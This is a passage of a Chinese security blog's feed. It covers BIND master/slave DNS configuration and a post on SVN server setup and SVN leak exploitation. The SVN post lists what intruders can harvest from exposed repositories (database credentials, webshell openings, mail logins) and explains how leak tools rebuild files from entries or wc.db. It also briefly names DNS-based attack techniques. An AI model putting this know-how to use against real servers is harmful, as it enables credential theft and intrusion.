class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># vi /var/named/chroot/etc/192.168.3.zone</span><br><span class="line"></span><br><span class="line">$TTL 3600</span><br><span class="line">$ORIGIN 3.168.192.in-addr.arpa.</span><br><span class="line">@IN SOAns1.admin.org.login.admin.org. (</span><br><span class="line">2001 // 时刻谨记,每次如果是手工修改完解析库文件以后都要自增一下</span><br><span class="line">900</span><br><span class="line">600</span><br><span class="line">86400</span><br><span class="line">3600</span><br><span class="line">)</span><br><span class="line">INNSns1.admin.org.</span><br><span class="line">INNSns2.admin.org.</span><br><span class="line">6INPTRwww.admin.org.</span><br><span class="line">5INPTRmx2.admin.org.</span><br><span class="line">4INPTRmx1.admin.org.</span><br><span class="line">61INPTRns2.admin.org.// 注意,这里必须要有一条ns记录指向我们后面的从DNS服务器</span><br><span class="line">3INPTRns1.admin.org.</span><br><span class="line">31INPTRpop3.admin.org.</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># chmod 640 192.168.3.zone</span><br><span class="line"># chown :named 192.168.3.zone</span><br><span class="line"># named-checkconf</span><br><span class="line"># named-checkzone &quot;3.168.192.in-addr.arpa&quot; 192.168.3.zone检查zone配置文件中是否有错误</span><br><span class="line"># ll /var/named/chroot/etc/</span><br><span class="line"># /etc/init.d/named reload</span><br><span class="line"># netstat -tulnp</span><br><span class="line"># host -t ptr 192.168.3.3 192.168.3.60</span><br><span class="line"># dig -x 192.168.3.4 @192.168.3.60</span><br></pre></td></tr></table></figure><p><img src="/img/dns reverse resolv.png" alt=""></p><p>0x12 当主DNS的正反向区域解析都没任何问题之后,我们开始来配置<code>主从DNS实时同步</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># yum install  bind-utils bind bind-devel bind-chroot -y</span><br><span class="line"># rpm -qa  bind-utils bind bind-devel bind-chroot</span><br></pre></td></tr></table></figure></p><p>开始配置从DNS,其实,在这里跟配置主DNS并没有太大区别,还是先按上面主DNS的配置方式来一遍<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"># &gt; /etc/named.conf</span><br><span class="line"># vi /etc/named.conf</span><br><span class="line">options &#123;</span><br><span class="line">version &quot;1.1.1&quot;;</span><br><span class="line">listen-on port 53 &#123; 192.168.3.61; 127.0.0.1; &#125;;</span><br><span class="line">directory &quot;/var/named/chroot/etc/&quot;;</span><br><span class="line">pid-file &quot;/var/named/chroot/var/run/named/named.pid&quot;;</span><br><span class="line">allow-query &#123; any; &#125;;</span><br><span class="line">Dump-file &quot;/var/named/chroot/var/log/binddump.db&quot;;</span><br><span class="line">Statistics-file &quot;/var/named/chroot/var/log/named_stats&quot;;</span><br><span class="line">zone-statistics yes;</span><br><span class="line">memstatistics-file &quot;log/mem_stats&quot;;</span><br><span class="line">empty-zones-enable no;</span><br><span class="line">forwarders &#123; 114.114.114.114;8.8.8.8; &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">key &quot;rndc-key&quot; &#123;</span><br><span class="line">algorithm hmac-md5;</span><br><span class="line">secret &quot;Eqw4hClGExUWeDkKBX/pBg==&quot;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">controls &#123;</span><br><span class="line">inet 127.0.0.1 port 953</span><br><span class="line">allow &#123; 127.0.0.1; &#125; keys &#123; &quot;rndc-key&quot;; &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">logging &#123;</span><br><span class="line">channel warning &#123;</span><br><span class="line">file &quot;/var/named/chroot/var/log/dns_warning&quot; versions 10 size 10m;</span><br><span class="line">severity warning;</span><br><span class="line">print-category yes;</span><br><span class="line">print-severity yes;</span><br><span class="line">print-time yes;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">channel general_dns &#123;</span><br><span class="line">file &quot;/var/named/chroot/var/log/dns_log&quot; versions 10 size 100m;</span><br><span class="line">severity info;</span><br><span class="line">print-category yes;</span><br><span class="line">print-severity yes;</span><br><span class="line">print-time yes;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">category default &#123;</span><br><span class="line">warning;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">category queries &#123;</span><br><span class="line">general_dns;</span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br><span class="line">include &quot;/var/named/chroot/etc/view.conf&quot;;</span><br></pre></td></tr></table></figure></p><p>配置rndc<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># vi /etc/rndc.key</span><br><span class="line"></span><br><span class="line">key &quot;rndc-key&quot; &#123;</span><br><span class="line">    algorithm hmac-md5;</span><br><span class="line">    secret &quot;Eqw4hClGExUWeDkKBX/pBg==&quot;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># vi /etc/rndc.conf</span><br><span class="line"></span><br><span class="line">key &quot;rndc-key&quot; &#123;</span><br><span class="line">algorithm hmac-md5;</span><br><span class="line">secret &quot;Eqw4hClGExUWeDkKBX/pBg==&quot;;</span><br><span class="line">&#125;;</span><br><span class="line">options &#123;</span><br><span class="line">default-key &quot;rndc-key&quot;;</span><br><span class="line">default-server 127.0.0.1;</span><br><span class="line">default-port 953;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>0x13 接着,再来配置<code>主从DNS正向区域实时同步</code>,务必要记得在主DNS的正向解析库中一定要先有一条ns记录的ip是指向从DNS服务器的,不然同步通知是无法完成的,也就是说,一旦主DNS发生改变,它会通知所有的ns服务器进行更新,这样就可以实现实时正向区域同步的效果</p><p>对于从DNS的配置就非常简单了,只需要在从DNS上编辑区域文件,在里面配置好主DNS服务器的ip,设置好从DNS正向区域文件名,然后启动服务即可,如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># vi /var/named/chroot/etc/view.conf</span><br><span class="line">view &quot;SlaveView&quot; &#123;</span><br><span class="line">    zone &quot;admin.org&quot; IN &#123;</span><br><span class="line">type    slave;// 这里的类型要选择从服务器</span><br><span class="line">masters &#123; 192.168.3.60; &#125;;// 指定主DNS服务器ip</span><br><span class="line">file &quot;slave.admin.org.zone&quot;;// 指定从DNS正向区域解析库文件名,重启服务后它会自动同步过来,不用手工编辑</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>上面配置没问题以后,我们来重载服务试试<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># ps -aux | grep named</span><br><span class="line"># cd /var/ &amp;&amp; chown named.named named/为了能让它自动创建解析库文件需要改先权限</span><br><span class="line"># ll /var/named/chroot/etc</span><br><span class="line"># /etc/init.d/named start</span><br><span class="line"># chkconfig named on</span><br><span class="line"># cat /var/named/chroot/etc/slave.admin.org.zone这个文件会在从dns重载之后自动被同步过来</span><br><span class="line"># netstat -tulnp</span><br><span class="line"># tail -f /var/log/messages其实,从日志中我们是可以清晰的看到整个同步过程的</span><br><span class="line"># dig -t MX admin.org @192.168.3.61 同步完成后,我们可以直接用本机来进行解析测试</span><br></pre></td></tr></table></figure></p><p><img src="/img/dns MASTER MX.png" alt=""></p><p>正向区域实时同步搞定之后,我们再来看看如何实现<code>反向区域实时主从同步</code>,还是要先在主DNS上的反向区域解析库中定义一条指向从DNS服务器的PTR记录,如下</p><p>首先,到主DNS服务器上去编辑反向区域解析库文件,添加一条指向从DNS服务器的PTR记录,具体如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># vi /var/named/chroot/etc/192.168.3.zone</span><br><span class="line"></span><br><span class="line">$TTL 3600</span><br><span class="line">$ORIGIN 3.168.192.in-addr.arpa.</span><br><span class="line">@IN SOAns1.admin.org.login.admin.org. (</span><br><span class="line">2001// 时刻谨记,每次如果是手工修改完解析库文件以后都要自增一下</span><br><span class="line">900</span><br><span class="line">600</span><br><span class="line">86400</span><br><span class="line">3600</span><br><span class="line">)</span><br><span class="line">INNSns1.admin.org.</span><br><span class="line">INNSns2.admin.org.</span><br><span class="line">6INPTRwww.admin.org.</span><br><span class="line">5INPTRmx2.admin.org.</span><br><span class="line">4INPTRmx1.admin.org.</span><br><span class="line">61INPTRns2.admin.org.// 先在主DNS的反向区域解析库中添加一条指向从DNS的PTR记录</span><br><span class="line">3INPTRns1.admin.org.</span><br><span class="line">31INPTRpop3.admin.org.</span><br></pre></td></tr></table></figure></p><p>之后,再回到从DNS服务器上编辑区域配置文件,添加一个反向区域,跟正向区域同步一样,依然是指明主DNS服务器ip和从DNS反向区域解析库文件名,之后再重载服务,测试解析即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># vi /var/named/chroot/etc/view.conf</span><br><span class="line"></span><br><span class="line">view &quot;SlaveView&quot; &#123;</span><br><span class="line">    zone &quot;admin.org&quot; IN &#123;</span><br><span class="line">type    slave;</span><br><span class="line">masters &#123; 192.168.3.60; &#125;;</span><br><span class="line">file &quot;slave.admin.org.zone&quot;;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    zone &quot;3.168.192.in-addr.arpa&quot; IN &#123;</span><br><span class="line">type slave;</span><br><span class="line">masters &#123; 192.168.3.60;  &#125;;</span><br><span class="line">file &quot;192.168.3.zone&quot;;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># rndc reload</span><br><span class="line"># cat /var/named/chroot/etc/192.168.3.zone依然是在重载服务以后,该反向区域解析库文件会被自动同步过来</span><br><span class="line"># host -t ptr 192.168.3.3 192.168.3.61</span><br></pre></td></tr></table></figure><p><img src="/img/dns master ptr.png" alt=""></p><p>0x14 关于DNS自身的安全问题<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">配置错误,修复简单</span><br><span class="line">各类投毒污染攻击,需要多方配合,篇幅原因后续我们再详细说</span><br><span class="line">bind工具自身的漏洞,时常注意官方发布的各类高危补丁,尤其是可以直接被远程利用的,而后进行适时修补或更新即可</span><br></pre></td></tr></table></figure></p><p>0x15 基于 DNS 的各类渗透技巧,其实说来,底层的原理非常简单,因为在一些脚本或者数据库中有很多那种可以直接用于发起DNS请求的函数,而我们就可以通过此来构造自己的各种攻击语句,然后再从解析log中提取执行结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">基于DNS log的sql盲注,代码及命令执行...后续有空接着说</span><br><span class="line">基于DNS隧道的各类远程,如,cobalt strike,关于这个,我们后续还会再单独抽出来详细说</span><br><span class="line">更多,待续...</span><br></pre></td></tr></table></figure></p><p>下面就是个简单的区域传送效果,不过像这种古董级漏洞,现在确实已经非常罕见了,属于敏感信息泄露的一种,容易直接被人看见内部的网络结构拓扑部署,祝大家好运吧 ^_^</p><p><img src="/img/dns zone vluln.png" alt=""><br><br></p><p>后话:<br>&nbsp;&nbsp;&nbsp;&nbsp;其实,像dns这种过于的基础服务,配置起来确实非常简单,不过,关键还是要能灵活应用,非常建议大家还是把绝大部分的时间都花在去深入理解dns的解析过程上,个人觉得那个才是真正的价值,因为所有的DNS高级应用场景,最底层全部都是基于这个,把最基础的东西搞通透以后,再去看各类高级应用就非常简单了,还是那句话<code>不管上层怎么变化,但万变不离其宗</code>,篇幅限制,此处仅仅也只是先带大家打个照面,更多高级应用,后续肯定还会有大量的篇幅说明,来日方长,我们待续……</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;0x01 首先,我们先来简单回顾下&lt;code&gt;DNS的基本解析流程&lt;/code&gt;, 比较简单,如下&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;-&amp;gt; 以客户端浏览器访问 www.rootkit.org 域名为例,首先,它会去检查当前浏览器缓存,如果有,就直接响应,如果没有,就继续往下找&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;-&amp;gt; 接着,操作系统会去检查自己的host文件,如果从中没找到对应关系,会再到系统dns缓存中查,如果缓存中有,就直接返回该域名所对应的ip&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;-&amp;gt; 如果缓存中没有,则会向我们事先设置好的dns服务器 [ 一般有两个, 主 &amp;amp; 备 ] 去请求,即所谓的`递归查询`,dns服务器首先会到自身解析数据库中去查&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;-&amp;gt; 如果dns服务器在自己的解析库中也没找到,它就会自动帮我们向根发送询问请求&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;-&amp;gt; 此时,根看到要请求的是org的后缀,就会把org所在的ns服务器告诉我们的dns&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;-&amp;gt; 然后,我们的dns服务器就会去请求org所在的ns服务器&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;-&amp;gt; 当请求到达org ns服务器时,org一看域名是在rootkit这个域下的,就会把rootkit所在的ns服务器再告诉我们的dns服务器&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;-&amp;gt; 再然后,我们的dns服务器就会去请求rootkit这个域的ns服务器&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;-&amp;gt; rootkit这个域的ns服务器一看是要访问www就直接找到了www对应的A记录的ip,并把它丢给我们的dns,上面逐个询问的过程,即 `迭代查询`&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;-&amp;gt; 最后,我们的dns再把最终解析到的这个ip丢给我们的客户端,然后客户端就直接拿着去访问了,如下,访问google.com时的简易流程图&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="DNS 深度理解" scheme="https://evil-404.github.io/categories/DNS-%E6%B7%B1%E5%BA%A6%E7%90%86%E8%A7%A3/"/>
    
    
      <category term="DNS 深度理解" scheme="https://evil-404.github.io/tags/DNS-%E6%B7%B1%E5%BA%A6%E7%90%86%E8%A7%A3/"/>
    
  </entry>
  
  <entry>
    <title>不再让 `泄露` 拖你的后腿 [ subversion篇 ]</title>
    <link href="https://evil-404.github.io/2017-12-11-svn-config-sec.html"/>
    <id>https://evil-404.github.io/2017-12-11-svn-config-sec.html</id>
    <published>2017-12-10T20:09:17.000Z</published>
    <updated>2017-12-23T01:56:26.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>0x01 关于 svn<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">同属C/S架构,对于svn服务端来讲,任何一个文件,在任何时刻的变化,都会被svn详细记录,并自动备份修改之前的结果,方便后续回滚</span><br><span class="line">其实,底层也是靠一个独立的`文件系统 FSFS`在维护,更多内部工作细节,大家可以直接去参考百科说明,此处废话不多讲,我们真奔主题...</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p><p>演示环境,注,此处为独立部署svn服务器,并非配合web服务一起使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CentOS6.9_x86_64 ip: 192.168.3.59</span><br><span class="line">win7cn ip: 192.168.3.70</span><br></pre></td></tr></table></figure></p><p>0x02 作为一名入侵者,从<code>svn</code>中你都能发掘到什么宝藏<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">可能最容易拿到的就是数据库的各种连接账号密码,前提是,目标数据库允许外连,这样你才能更优雅的脱裤或者想办法构造上传webshell</span><br><span class="line">一些邮箱账号密码,如果目标有自己的vpn或者owa之类的入口还是很值得尝试的</span><br><span class="line">直接的后端代码,除了能局部审下代码之外,在注释里面也许还能看到一些关于开发人员的敏感信息</span><br><span class="line">其它的各种敏感配置信息,非常多,这里就不一一细说了</span><br><span class="line">注意,有些信息,确实不能让我们一刀毙敌,但高效的渗透往往是对各类敏感信息的相互配合及深度利用,这非常重要</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p><a id="more"></a><p>0x03 既是说svn,觉得还是非常有必要先来了解下关于svn的详细部署及使用过程,总得先把它玩熟了,懂它是怎么工作的,对后续漏洞的理解才会更深刻,相信做开发的朋友,对这个早都已经非常熟练了,废话到此为止,首先,我们先来安装好 <code>subversion</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># rpm -qa subversion</span><br><span class="line"># yum install subversion -y</span><br><span class="line"># svnversion --version这里用的svn版本为1.6.11,也就是说,目录结构都存在wc.db中</span><br></pre></td></tr></table></figure></p><p>0x04 准备好各种目录,<code>svn</code>为总的svn所有数据存放目录,<code>svndata</code>为代码数据文件存放目录,<code>svnpasswd</code>为密码和权限管理文件存放目录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># mkdir /svn/&#123;svndata,svnpasswd&#125; -p 创建svn所需的各种目录</span><br><span class="line"># svnserve -d -r /svn/svndata指定svn根目录并后台运行svn服务</span><br><span class="line"># lsof -i :3690subversion默认工作在3690端口</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 创建项目目录,一般来讲一个项目对应一个目录</span><br><span class="line"># 另外注意,这里必须要用svnadmin工具来创建,因为它要生成指定格式的数据,符合`FSFS 文件系统`格式的数据</span><br><span class="line"># svnadmin create /svn/svndata/svndoc</span><br><span class="line"># tree /svn/svndata/svndoc</span><br><span class="line"># tree /svn/svndata/svndoc/conf</span><br></pre></td></tr></table></figure><p>0x05 开始针对此项目配置svn账户<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># cd /svn/svndata/svndoc/conf</span><br><span class="line"># cp svnserve.conf svnserve.conf.bak</span><br><span class="line"># vi svnserve.conf </span><br><span class="line">  [general] # 公共选项设置区域</span><br><span class="line">  anon-access = none      # 禁止svn被匿名访问</span><br><span class="line">  auth-access = write      # 让用户可写,即,能提交</span><br><span class="line">  password-db = /svn/svnpasswd/passwd # 指定svn账号密码文件 </span><br><span class="line">  authz-db = /svn/svnpasswd/authz     # 指定svn授权管理文件</span><br><span class="line">  </span><br><span class="line">  [sasl]# 该区域一般会配合域控或ldap一起使用</span><br><span class="line">  </span><br><span class="line"># mv authz passwd /svn/svnpasswd/</span><br><span class="line"># cd /svn/svnpasswd/</span><br></pre></td></tr></table></figure></p><p>创建svn账号密码,因为svn默认直接存的是明文账号密码,为了防止其他人看到密码,所以要先把权限剔干净<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># vi passwd </span><br><span class="line">  [users]  # 实际中的密码,肯定是要严格按照`密码复杂性要求`来给的</span><br><span class="line">  web = 654321</span><br><span class="line">  webadmin = admin110</span><br><span class="line">  admin = 123456</span><br><span class="line">  bakuser = admin</span><br><span class="line">  guest = svn110</span><br><span class="line">  svn = svnadmin</span><br><span class="line"></span><br><span class="line"># chmod 600 passwd</span><br></pre></td></tr></table></figure></p><p>对不同的svn用户可以分别进行授权<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># vi authz</span><br><span class="line">  [aliases]</span><br><span class="line">  [groups]      # 对不同业务的用户可以进行分组授权</span><br><span class="line">  administrator = web</span><br><span class="line">  sec = webadmin,admin</span><br><span class="line"></span><br><span class="line">  [svndoc:/]</span><br><span class="line">  svn = rw</span><br><span class="line">  @administrator = rw # 只需要用@即可引用指定的分组用户,如,在此让administrator组的用户可以正常读写</span><br><span class="line"></span><br><span class="line">  [svndoc:/web01]     # 为每个不同的用户创建一个子分支,让指定的用户只能待在指定的分支下</span><br><span class="line">  bakuser = rw</span><br><span class="line"></span><br><span class="line">  [svndoc:/web02]</span><br><span class="line">  guest = rw</span><br></pre></td></tr></table></figure></p><p>所有配置完成后,记得重启svn服务才能生效,此处是都直接是用root来运行svn的,如果你觉得权限过高,完全可以单独创建一个普通系统用户来搞,个人暂时觉得,这关系并不大<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># pkill svnserve</span><br><span class="line"># svnserve -d -r /svn/svndata</span><br><span class="line"># lsof -i :3690</span><br></pre></td></tr></table></figure></p><p>0x06 关于linux下svn客户端工具的基本使用说明</p><p>如果你想直接在svn服务器上查看指定项目下的所有文件,如下,只需按照目录层级,一级一级往下看即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># svn list file:///svn/svndata/svndoc --verbose</span><br><span class="line"># svn list file:///svn/svndata/svndoc/web01/vsftp --verbose</span><br></pre></td></tr></table></figure></p><p>checkout 导出所有数据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># mkdir ./svndata</span><br><span class="line"># svn co svn://192.168.3.59/svndoc ./svndata/ --username=svn --password=svnadmin</span><br></pre></td></tr></table></figure></p><p><img src="/img/checkout linux.png" alt=""><br>update 更新数据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># svn up ./svndata/ --username=svn --password=svnadmin</span><br></pre></td></tr></table></figure></p><p><img src="/img/update linux.png" alt=""><br>commit 提交代码,务必记得,要先加入,后提交<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># svn add *</span><br><span class="line"># svn ci -m &quot;test&quot;  带更新说明提交</span><br></pre></td></tr></table></figure></p><p><img src="/img/commit linux.png" alt=""></p><p>0x07 在win下则可使用tortoisesvn svn客户端,想必做开发朋友,对此工具都已经熟的不能再熟了,只需要指定项目地址,提交正确的svn账号密码update一下就可以滋润的写代码了 ^_^<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">svn://192.168.3.59/svndoc</span><br></pre></td></tr></table></figure></p><p><img src="/img/checkout.png" alt=""><br><img src="/img/checkout login.png" alt=""><br><img src="/img/checkout login res.png" alt=""><br>如果你不小心用tortoisesvn保存了密码,此时又想切换到不同的svn用户来测试权限,密码文件默认保存路径如下,直接去把该目录下的所有文件全部干掉即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\klion\AppData\Roaming\Subversion\auth\svn.simple</span><br></pre></td></tr></table></figure></p><p>0x08 关于svn泄露利用工具的底层实现细节,其实,个人觉得此类工具的技术含量并不高,除了msf自身提供的利用模块,关于此类的工具早已多如牛毛,使用也基本全程傻瓜化,此处就不具体演示了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在svn版本 &lt; 1.6 时,会先去读取entries文件的中的目录结构,因为默认文件名都是直接明文存的</span><br><span class="line">所以直接通过逐个拼接遍历访问即可读取entries中所有的文件内容</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在svn版本 &gt;= 1.6 时,文件名会先被hash下,然后再按照文件名对应hash的方式存到wc.db中,就是个sqlite数据库</span><br><span class="line">而我们之后要做的事情也非常简单,只要拿着指定的hash去wc.db中查到对应的文件名,再逐个进行拼接遍历访问读取即可</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td 